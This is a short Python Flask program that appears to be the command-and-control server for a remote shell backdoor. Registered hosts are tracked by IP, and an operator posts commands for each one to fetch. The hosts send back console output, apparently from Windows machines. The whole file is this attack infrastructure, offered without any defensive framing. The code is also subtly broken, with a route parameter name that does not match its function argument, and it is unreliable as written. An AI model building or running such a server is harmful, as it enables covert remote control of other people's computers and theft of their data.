from flask import Flask, request
import socket


app = Flask(__name__)
users = {}


@app.route('/users/<user_name>')
def list_users(ip):
    @app.route(f'/users/{ip}/cmd', methods=['GET', 'POST'])
    def cmd():
        if request.method == 'POST':
            users[ip]['command'] = request.form['command']
            if users[ip]['command'] == 'clear':
                users[ip]['out'] = ''
            else:
                users[ip]['out'] += users[ip]['command'] + '<br/>'
        return users[ip]['command']

    @app.route(f'/users/{ip}/output', methods=['GET', 'POST'])
    def output():
        if request.method == 'POST':
            req = request.form['out'].encode('cp1251').decode('cp866')
            req = req.replace("\n", "<br/>")
            if req != '':
                users[ip]['out'] += req + '<br/>' + '-' * 600 + '<br/>'
        return users[ip]['out']

    @app.route(f'/users/{ip}/clear', methods=['GET'])
    def clear():
        users[ip]['command'] = ''
        return "Command cleared"
    return 'This page lists all users'


@app.route("/new_user", methods=['GET', 'POST'])
def new_user():
    ip = request.form['ip']
    if ip not in users:
        users[ip] = {'out': '', 'command': ''}
    list_users(ip)
    return "new guy joined!!!"


if __name__ == '__main__':
    app.run()
